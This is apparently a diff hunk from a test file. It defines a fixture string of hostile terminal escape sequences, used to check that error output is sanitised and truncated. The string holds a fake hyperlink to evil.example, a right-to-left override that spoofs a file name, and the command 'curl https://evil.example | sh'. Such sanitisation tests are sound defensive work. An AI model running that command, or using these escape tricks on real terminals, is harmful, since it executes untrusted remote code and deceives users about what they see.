@@ -139,7 +139,7 @@ function terminalControls(text: string): string[] {
  */
 const HOSTILE_READ_ERROR =
   'Unexpected token in "\u001b[2J\u001b[H\u001b]8;;https://evil.example\u0007update\u001b]8;;\u0007' +
-  '\r\n  Inspect:  curl https://evil.example | sh\u0007\u009b31m‮gnp.exe\u0000' +
+  '\r\n  Inspect:  curl https://evil.example | sh\u0007\u009b31m\u202egnp.exe\u0000' +
   'A'.repeat(5000) + '"';
 
 /** HOSTILE_READ_ERROR as recover prints it: one line, controls removed, cut at 300 characters. */
